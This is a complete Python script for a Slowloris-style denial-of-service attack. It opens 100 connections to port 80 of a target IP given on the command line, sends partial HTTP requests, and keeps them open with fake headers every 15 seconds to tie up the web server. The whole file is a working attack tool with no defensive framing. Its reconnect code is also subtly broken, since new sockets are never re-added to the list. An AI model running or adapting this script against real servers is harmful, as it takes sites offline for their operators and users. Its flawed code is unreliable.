import socket
import random
import time
import sys

SOCKET_NUM = 100
socket_list = []
ip = sys.argv[1]

print("Connecting to {} with {} connections".format(ip, SOCKET_NUM))

# Create connections for the ma number of the webserver
for i in range(SOCKET_NUM):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(4)
		s.connect((ip, 80))
	except socket.error:
		break
	socket_list.append(s)

# Request the pages from the webserver
request = "GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode("utf8")
headers = [
	"User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
	"Accept-language: en-US,en,q=0.5",
]

for s in socket_list:
	s.send(request)
	for header in headers:
		s.send(bytes("{}\r\n".format(header).encode("utf-8")))

# Keep all the connections alive
while True:
	print("Sending keep-alive headers...")

	for s in socket_list:
		try:
			s.send("X-a: {}\r\n".format(random.randint(0, 2000)).encode("utf-8"))
		except socket.error:
			socket_list.remove(s)
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.settimeout(4)
				s.connect((ip, 80))
				for s in socket_list:
					s.send(bytes("{}\r\n".format(header).encode("utf-8")))
			except socket.error:
				continue
	time.sleep(15)
		
 
